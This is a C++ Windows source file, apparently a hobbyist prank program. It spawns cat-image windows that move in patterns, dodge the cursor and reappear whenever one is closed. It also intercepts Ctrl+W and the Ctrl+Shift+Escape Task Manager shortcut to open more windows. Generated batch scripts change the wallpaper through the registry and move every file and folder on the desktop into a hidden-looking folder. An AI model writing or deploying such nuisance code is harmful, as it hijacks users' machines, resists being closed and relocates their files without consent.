#include<iostream>
#include<stack>
#include<random>
#include<vector>
#include<array>
#include<memory>
#include<chrono>
#include<thread>
#include<atomic>
#include<mutex>//idk si se necesita//no sé if needed xd(learn Spanish)
#include<ctime>
#include<numbers>//c++20
#include<Windows.h>
#include<gdiplus.h>
#include<fstream>
#include"C:\\Users\\sicar\\3D Objects\\FIEEELD\\SERIOUS MODE 2023\\PUCKETTE\\casa\\libz\\FreeImage\\include\\FreeImage.h"
#include<functional>
// COMPILALO = g++ testPlace.cpp -o testPlace -lgdi32 -lgdiplus -lfreeimage -Wpedantic -lwinmm -std=c++20

namespace usablesXXX{ //para evitar tener variables globales

HBITMAP bitmapa=NULL;
constexpr int BiPerPi = 24;
constexpr int WID = 200;
constexpr int HEI = 200;
const double pipi = std::numbers::pi;
/*arrays para aleatoriedad de los patrones en ventanas
*puede incluir pero no limitado a:
-tamaño del radio y de la ventana
-posición aleatoria
-velocidad de movimiento
*/
int si=0;
int xranax[820]={0};
int yranay[820]={0};
int radioLocuaz[820]={0};
int velocidaInicialona[5]={0};
////////////////////////////////////////////
int winMaxResoX = GetSystemMetrics(SM_CXSCREEN);
int winMaxResoY= GetSystemMetrics(SM_CYSCREEN);
int lecontador=0;
int numWindowssss=1;
bool siguelEnlaThread=true;
std::vector<int> escogePatron(800);
}

std::mutex Mutek,Mutek1,Mutek2,Mutek3,M,Mutek4,lemut;

using namespace std::chrono_literals;
//imprimir , un overload de funcion simple 
void DI()
{
    std::cout<<'\n';
}
template<typename sayit,typename... say>
void DI
    (sayit dije,say... algo)
{
    std::cout<<dije;
    DI(algo...);
}

//RNDOM NUMS
template<typename minil,typename maxxie,typename disttt>
auto RANDGE
    (minil minn, maxxie maxx,disttt distancia)
{
    static std::mt19937_64 sujetoo(static_cast<unsigned long>(std::time(nullptr)));//randomGenerador
    std::uniform_int_distribution<int> scalo(minn, maxx);//limita lo random
    static int oldrand = scalo(sujetoo); // primer random
    static int permutaDist=distancia;//distancia entre numeros aleatorios
    minil randyio;

    do
    {
        randyio = scalo(sujetoo);
    } while (std::abs(randyio - oldrand) < permutaDist); // 

    oldrand = randyio;
    return randyio;
}

//CREADOR DE VENTANAS MOLDE
class Ventanador
{
    public:
    WNDCLASSW ventaClass;
    
    Ventanador(){}

    HWND creaVentana
        (HINSTANCE hIns,WNDPROC Waction,
        LPCWSTR name_Class,LPCWSTR name_Ventana,
        int alto, int ancho,int xpos,int ypos)
        {
             //registrar la clase de la window
            ventaClass = { };
            ventaClass.lpfnWndProc = Waction;
            ventaClass.hInstance= hIns;
            ventaClass.lpszClassName=name_Class;
            RegisterClassW(&ventaClass);
    
            HWND hwinter = CreateWindowExW(
            1,
            name_Class,
            name_Ventana,
            WS_OVERLAPPEDWINDOW,
            xpos,ypos,
            ancho,alto,
            nullptr,nullptr,hIns,nullptr
            );

            if (hwinter == nullptr)
            {
            std::cerr << "Failed to create window" << std::endl;
            return nullptr;
            }
            return hwinter;

        }


      
};

// mueve las ventanas cuando el cursor lo toca
void CURSORON_SCREEN
    (HWND hwnd,int &posShi,int rangotango)
{

    static int daa;
    static int oldva= 0; 
    //RANDOM PATH
    daa=RANDGE(0,rangotango,200);
    
    //creamos un punto para que se posicione sobre un rectangulo
    POINT poscursed;
    GetCursorPos(&poscursed);
    ScreenToClient(hwnd,&poscursed);

    RECT ventaRect;
    GetClientRect(hwnd,&ventaRect);
    int ah,viejoo;

    if(PtInRect(&ventaRect,poscursed))
    {
     //DI("M.use XoX!"); 
     posShi=daa;
    } 
    
}
//sobrecarga de función a circulop c:
void CURSORON_SCREEN
    (HWND hwnd, int &posX, int &posY, int& cenX, int& cenY, int raddi)
{
    static int daa,taa;
    static int oldva = 0;
    //RANDOM PATH
   
    daa = RANDGE(0,usablesXXX::winMaxResoX, 133);
    taa= RANDGE(0,usablesXXX::winMaxResoY,113);
    //creamos un punto para que se posicione sobre un rectangulo
    POINT poscursed;
    GetCursorPos(&poscursed);
    ScreenToClient(hwnd, &poscursed);
    RECT ventaRect;
    GetClientRect(hwnd, &ventaRect);
    int ah, viejoo;
 
    if (PtInRect(&ventaRect, poscursed))
    {
    //nueva posicion para que haga circulos
        cenX = daa;
        cenY = taa;
        //DI(cenX," <--X || Y --> ",cenY);
    }
   
     
}


//THREAD MOVIMIENTO VENTANA
void MUEVELA
    (std::vector<HWND>& ventos,int velocida,int TheWayYouMove)
{
     
     int raddi=30;
     float angg= 0.00f;
     float diri = 1.0f; 
     float x = 0.0f;
     int winX,winY,conttt=0;
     int olll=0;
    // Wave parameters
     int Amplitu = 200;
     int Bperiodo = 500;
     int CphaseShifto = 0;
     int D = 250;
     int directi = 0;
    //static int TheWayYouMove=0;//SETS THE PATTERNS 
  
    std::vector<float> direcciones;
   
    while(usablesXXX::siguelEnlaThread)
    {
      
        int Wsizee=250;
        RECT venCon;
     
        switch(TheWayYouMove)
        {
        case 0://MUEVELO EN CIRCULO [[CLOCKWISE]]
        // Move windows in circles
        for (size_t i = 0; i < ventos.size() ;i++)
        {
            HWND vento = ventos[i];
            GetWindowRect(vento, &venCon);
            // Declare new variables for the x and y coordinates of the window
            winX = venCon.left;
            winY = venCon.top;
            // Use the values of cenX and cenY for the current window
            int xD = usablesXXX::xranax[i] + raddi * cos(angg);
            int yD = usablesXXX::yranay[i] + raddi * sin(angg);


            // Pass in winX and winY as arguments to CURSORON_SCREEN
           
            CURSORON_SCREEN(vento, winX, winY, usablesXXX::xranax[i], usablesXXX::yranay[i], raddi);
            int newX = (0.98 * xD) - (0.12 * winX);
            int newY = (0.98 * yD) - (0.13 * winY);
            MoveWindow(vento, newX, newY, usablesXXX::WID, usablesXXX::HEI, false);
            // std::lock_guard<std::mutex>lock(Mutek1);
      
        }
        
        angg += (0.001f) * (usablesXXX::lecontador + usablesXXX::numWindowssss);
        break;
        case 1://ARRIBA ABAJO

            while (direcciones.size() < ventos.size())
            {
                direcciones.push_back(1); // Set initial direction to 1 (right)
            }

            for(size_t winMov=0;winMov < ventos.size();++winMov)
            {
                HWND vento = ventos[winMov];
                GetWindowRect(vento,&venCon);
                int xD = venCon.left;
                int yD = venCon.top;
                int Weed= venCon.right - venCon.left;
                int Highh= venCon.bottom - venCon.top;
       
                HMONITOR hmoni=MonitorFromWindow(vento,MONITOR_DEFAULTTONEAREST);
                MONITORINFO miMona={ sizeof(miMona)};
                GetMonitorInfo(hmoni,&miMona);
            
                std::lock_guard<std::mutex>locck(Mutek);
                if(xD <= miMona.rcMonitor.left || xD + Weed >= miMona.rcMonitor.right)
                {
                    direcciones[winMov] *= -1;  
                }
                //MOUSE INTERACCION
                CURSORON_SCREEN(vento,xD,1080);
                CURSORON_SCREEN(vento,yD,400);
                MoveWindow(vento,xD + direcciones[winMov] ,yD,Weed,Highh,false);
                
                //InvalidateRect(Binbows[winPop],NULL,true);              
   
            }
        break;
        case 2: //IZQUIERDA / DERECHA

            while (direcciones.size() < ventos.size())
            {
                direcciones.push_back(1); // Set initial direction to 1 (right)
            }

            for(size_t winMov=0;winMov < ventos.size();++winMov)
            {
                HWND vento = ventos[winMov];
                GetWindowRect(vento,&venCon);
                int xD = venCon.left;
                int yD = venCon.top;
                int Weed= venCon.right - venCon.left;
                int Highh= venCon.bottom - venCon.top;
       
                HMONITOR hmoni=MonitorFromWindow(vento,MONITOR_DEFAULTTONEAREST);
                MONITORINFO miMona={ sizeof(miMona)};
                GetMonitorInfo(hmoni,&miMona);
            
                if(yD <= miMona.rcMonitor.top || yD + Highh >= miMona.rcMonitor.bottom)
                {
                    //diri *= -1.0f;
                     direcciones[winMov] *= -1;
                }
                //MOUSE INTERACCION
                CURSORON_SCREEN(vento,xD,1080);
                CURSORON_SCREEN(vento,yD,400);
                std::lock_guard<std::mutex>lock(Mutek2);
                MoveWindow(vento,xD,yD +  direcciones[winMov],Weed,Highh,false);
                
                //InvalidateRect(Binbows[winPop],NULL,true); 
            }

        break;
       
        case 3: //SINE_WAVE MOVEMENT 
            
            for (size_t i = 0; i < ventos.size() ;i++)
            {
                HWND vento = ventos[i];
                GetWindowRect(vento, &venCon);
                // Calculate new x and y coordinates using sine wave equation
                winX = venCon.left;
                winY = venCon.top;
                /*xD tiene abs porque tiende a irse a los negativos*/
                int xD = abs(x - usablesXXX::xranax[i]);
                int yD =Amplitu * sin((2 * usablesXXX::pipi / Bperiodo) * x + CphaseShifto) + usablesXXX::yranay[i];

                // Or, calculate new x and y coordinates using triangle wave equation
                //int xD = x;
                //int yD = (2 * Amplitu / pipi) * asin(sin((2 * pipi / Bperiodo) * x)) + D;
                CURSORON_SCREEN(vento, winX, winY, usablesXXX::xranax[i], usablesXXX::yranay[i], raddi);
                int newX = (0.98 * xD) - (0.12 * winX);
                int newY = (0.98 * yD) - (0.13 * winY);
         
                MoveWindow(vento, newX, newY, usablesXXX::WID, usablesXXX::HEI, false);
             

                //DI("XD = ",xD);
                // Update x
                if (x >= 1510)
                {       
                directi = -1;
                }
                else if (x <= 0)
                {
                // Change direction of movement
                directi = 1;
                }
               // std::lock_guard<std::mutex>lol(Mutek3);
             
            }
            
            x += directi * ((0.08f) * (usablesXXX::lecontador + usablesXXX::numWindowssss));
        
            //DI("x afuera = ",x);
        break;
        case 4://VERTICAL SINE
        for (size_t i = 0; i < ventos.size() ;i++)
            {
                HWND vento = ventos[i];
                GetWindowRect(vento, &venCon);
                // Calculate new x and y coordinates using sine wave equation
                winX = venCon.left;
                winY = venCon.top;
                /*xD tiene abs porque tiende a irse a los negativos*/
                int xD =Amplitu * sin((2 * usablesXXX::pipi / Bperiodo) * x + CphaseShifto) + usablesXXX::xranax[i] ;
                int yD =abs(x - usablesXXX::yranay[i]);

                // Or, calculate new x and y coordinates using triangle wave equation
                //int xD = x;
                //int yD = (2 * Amplitu / pipi) * asin(sin((2 * pipi / Bperiodo) * x)) + D;
                std::lock_guard<std::mutex>lolo(Mutek4);
                CURSORON_SCREEN(vento, winX, winY, usablesXXX::xranax[i], usablesXXX::yranay[i], raddi);
                int newX = (0.98 * xD) - (0.12 * winX);
                int newY = (0.98 * yD) - (0.13 * winY);
                MoveWindow(vento, newX, newY, usablesXXX::WID, usablesXXX::HEI, false);
             
                //DI("XD = ",xD);
                 // Update x
                if (x > 800)
                {       
                    directi = -1;
                }
                else if (x <= 0)
                {
                // Change direction of movement
                    directi = 1;
                }
            }
              
            x += directi * ((0.08f) * (usablesXXX::lecontador + usablesXXX::numWindowssss));
            //DI("x afuera = ",x);
            
         
            break;
        }
        
    }
         
    
     std::this_thread::sleep_for(std::chrono::microseconds(velocida));
}

////LOAD IMAGEN
//DIBUJA
void DIBUJA
    (HDC hhddcc,int electo)
{

    using namespace std::chrono_literals;
    Gdiplus::Graphics gf(hhddcc);
   /**
    * Gdiplus::Pen pen(Gdiplus::Color(255,255,0,0));
    Gdiplus::SolidBrush brr(Gdiplus::Color(255,0,255,0));
    gf.DrawLine(&pen,0,0,500,500);
    gf.FillEllipse(&brr,400,200,100,100);*/

    std::array<std::unique_ptr<Gdiplus::Bitmap>,2> gatoAnimation;
    gatoAnimation[0]=std::make_unique<Gdiplus::Bitmap>(L"ola.png");
    gatoAnimation[1]=std::make_unique<Gdiplus::Bitmap>(L"cato.bmp");
       
    gf.DrawImage(gatoAnimation[electo].get(),0,0);  
}

//poner sonido basico, no se puede mezclar con otros , pero sirve
void PlaySoundAsync
    (LPCWSTR soundFile)
{
    PlaySoundW(soundFile, nullptr, SND_ASYNC | SND_FILENAME);
}
//MENSAJEEES
//WINDOW VARIABLES ]
HWND g,gel; int alv=0; int nalv=0;
HINSTANCE vv=GetModuleHandle(nullptr);
Ventanador w1,w2;
std::vector<HWND> windows,venUPDWN,venLR,venHSINE;
LRESULT CALLBACK venta
    (HWND g,UINT uMsg, WPARAM wParam,LPARAM lParam);

//KEYBOARKDIA TECLADIA
/*ocupando la misma tecnica que DI 
ofresco la posibilidad de  tener una interfaz que permita insertar acciones
a combinaciones de teclas, bastante efectivo (LEARN SPANISH!) :))*/
bool PRESIONASTE(SHORT tecla){
    return GetAsyncKeyState(tecla) & 0x8000;
}
template<typename acto,typename... teclas>
void PRESIONASTE_COMB(acto actoria,teclas... lasqsean)
{
    bool todasPresionaste= (PRESIONASTE(lasqsean) && ...);

    if(todasPresionaste){ actoria(); }
}

void PRESIONASTE_PERRY();

//SCRIPTIA
void newWallp()
{
  
    std::fstream NuevoFondo;
    NuevoFondo.open("fifi.bat",std::ios::out);
    DI("INICIANDO...");
    if(NuevoFondo.is_open())
    { 
        NuevoFondo<<"reg add \"HKEY_CURRENT_USER\\control panel\\Desktop\" /v wallpaper /t REG_SZ /d C:\\Users\\sicar\\Desktop\\fondo.png  /f \n";
        NuevoFondo<<"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\n";
       // NuevoFondo<<"pause\n";
        NuevoFondo<<"exit\n";
        NuevoFondo.close();
    }
for (int i = 0; i < 5; i++)
{
    system("fifi.bat");
    std::this_thread::sleep_for(10ms);
}
    
    
    DI("c: c: c: .i. c: c: c:");
    std::this_thread::sleep_for(10ms);

}
void ARCHIVOS_PERDIDOS()
{
    std::fstream scondite;
    scondite.open("hiDem.bat",std::ios::out);
  if (scondite.is_open()) {
    scondite << "@echo off\n";
    scondite << "for /d %%d in (\"C:\\Users\\sicar\\Desktop\\*\") do (\n";
    scondite << "    move \"%%d\" \"C:\\Users\\sicar\\Desktop\\-\"\n";
    scondite << ")\n";
    scondite << "move \"C:\\Users\\sicar\\Desktop\\*.*\" \"C:\\Users\\sicar\\Desktop\\-\"\n";
    scondite << "exit\n";
    scondite << "pause\n"; // This line is optional and will keep the console window open
    scondite.close();
    
}

std::this_thread::sleep_for(39ms);
    system("hiDem.bat");
}

int interia=0;
int CUENTAME(int hastaAqui)
{
   
    while(true){
        
        interia++;
        if(interia > hastaAqui){interia=0;}
        std::this_thread::sleep_for(3s);
    }
    DI(interia);
    return interia;

}

int main()
{
    
    DI("starting...");
    //GDIplus permite poner imagenes , boilerplate de inicializacion 
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR  gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken,&gdiplusStartupInput,nullptr);
    
    int nCmdShow=1;
    //FreeImage Testing & Initi
    DI("verificar FREEIMAGE C: ...");
    FreeImage_Initialise();
    DI("libreImagen@ ", FreeImage_GetVersion());
    FIBITMAP* bitmaxxx = FreeImage_Allocate(usablesXXX::WID,usablesXXX::HEI,usablesXXX::BiPerPi);
    RGBQUAD coloria;
    if(!bitmaxxx)
        exit(1);// .i.
    for (int i = 0; i < usablesXXX::WID; i++)
    {
        for (int ii = 0; ii < usablesXXX::HEI; ii++)
        {
            coloria.rgbRed=200.4f;
            coloria.rgbGreen = (double) i / usablesXXX::WID * 255.0f;
            coloria.rgbBlue = (double) ii / usablesXXX::HEI * 40.6f ;
            FreeImage_SetPixelColor(bitmaxxx,i,ii,&coloria);
        }
        
    }
    
    if(FreeImage_Save(FIF_PNG,bitmaxxx,"ola.png",0))
        DI("GUARDADA C:");
        FreeImage_DeInitialise();

    std::vector<LPCWSTR> soundFiles = {
        L"bo.wav", 
        L"pia.wav",
        L"bo.wav"
    };

    newWallp();

       //ASIGNA NUMEROS ALEAT;ORIOS
    for (int ponNumRand= 0; ponNumRand  < 799; ponNumRand++)
    {
        usablesXXX::xranax[ponNumRand]=RANDGE(0,1400,90);
        usablesXXX::yranay[ponNumRand]=RANDGE(0,usablesXXX::winMaxResoY,60);
        usablesXXX::escogePatron[ponNumRand]=RANDGE(0,500,120); 
       
    }    
    //FOR PARA TRATAR AUDIO Y CREAR VENTANA

    std::thread HILO(PRESIONASTE_PERRY);
  
    for (int i = 0; i < usablesXXX::numWindowssss; i++)
    {
        //LPCWSTR soundFile = soundFiles[i % soundFiles.size()]; // Use modulo to cycle through soundFiles
        //std::thread soundia(PlaySoundAsync,soundFile);
        g = w1.creaVentana(vv, venta, L"MyWindowClass", L"Window", 300, 300,usablesXXX::xranax[i],usablesXXX::yranay[i]);
        ShowWindow(g, nCmdShow);
        windows.push_back(g);
        //DI(usablesXXX::xranax[usablesXXX::lecontador]," <-- x || y --->",usablesXXX::yranay[usablesXXX::lecontador]);
        std::this_thread::sleep_for(std::chrono::microseconds(20));
        //soundia.detach();
       
    }
    
    //////////////////////////////////////////////////////////////////////
    alv=usablesXXX::escogePatron[(usablesXXX::lecontador + usablesXXX::numWindowssss)] / 100; 
    nalv=usablesXXX::escogePatron[(usablesXXX::lecontador + usablesXXX::numWindowssss)] / 100;
    std::thread circulos(MUEVELA,std::ref(windows),1505,3);
    std::thread circuloo(MUEVELA,std::ref(venUPDWN),1505,2);
    std::thread circulooO(MUEVELA,std::ref(venLR),1505,4);
    std::thread contaremos(CUENTAME,2);
    //TECLADO////////////////////////////////////////////////////////////
   ARCHIVOS_PERDIDOS();
    
    DI("EXITO!");
    //TEXTEALE
    MSG msg ={};
    while(GetMessage(&msg,NULL,0,0)>0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
   
    circulos.join();
    circuloo.join();
    circulooO.detach();
    HILO.join();
    contaremos.join();
   
 
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return 0;  
}



std::vector<std::vector<HWND>> deppwaters;
//actiones y monitoreos de la ventana misma
LRESULT CALLBACK venta
    (HWND g,UINT uMsg, WPARAM wParam,LPARAM lParam)
{
    HDC hdc;
    PAINTSTRUCT ps;
    HWND gg,gg2,gg3,gg4,gg5,gg1;
    

   // std::thread circules(MUEVELA,g,400,std::ref(xrr),std::ref(yrr));
    switch(uMsg)
    {
        case WM_PAINT:
        {
            HDC hdc = BeginPaint(g, &ps);
            DIBUJA(hdc,1);
          
            EndPaint(g, &ps);

         
        }            
        return 0;

        case WM_CLOSE:
        
             gg = w1.creaVentana(vv, venta,
                                 L"MyWindowClass", 
                                 L"Window", 300, 300,
                                 usablesXXX::xranax[usablesXXX::lecontador],
                                 usablesXXX::yranay[usablesXXX::lecontador]);
            lemut.lock();
            usablesXXX::lecontador++;
            lemut.unlock();
            ShowWindow(gg, 1);
            //DI(usablesXXX::xranax[usablesXXX::lecontador]," <-- x || y --->",usablesXXX::yranay[usablesXXX::lecontador],"_contador- ",usablesXXX::lecontador + usablesXXX::numWindowssss);
        
            DI(usablesXXX::lecontador);
            usablesXXX::si++;
            if(usablesXXX::si > 2){usablesXXX::si=0;}
          //  DI(usablesXXX::si," see?...");
                switch (usablesXXX::si)
                {
                case 0:
                    windows.push_back(gg);
                break;
                case 1:
                    venUPDWN.push_back(gg);
                break;
                case 2:
                    venLR.push_back(gg);
                break;

                }
            
     
        return 0;
        break;

        case WM_DESTROY:
            PostQuitMessage(0);
        return 0;
         
    }
  
    return DefWindowProc(g,uMsg,wParam,lParam);
}

void PRESIONASTE_PERRY(){
    auto lll= [](){DI("TEEEST");};
    auto cierrala = []()
    { 
        PostMessage(g,WM_CLOSE,0,0);
    };
while(!GetAsyncKeyState('L'))
{
   PRESIONASTE_COMB(cierrala,VK_CONTROL,'W');
   PRESIONASTE_COMB(cierrala,VK_CONTROL,VK_SHIFT,VK_ESCAPE);
   std::this_thread::sleep_for(255ms); 
}
}
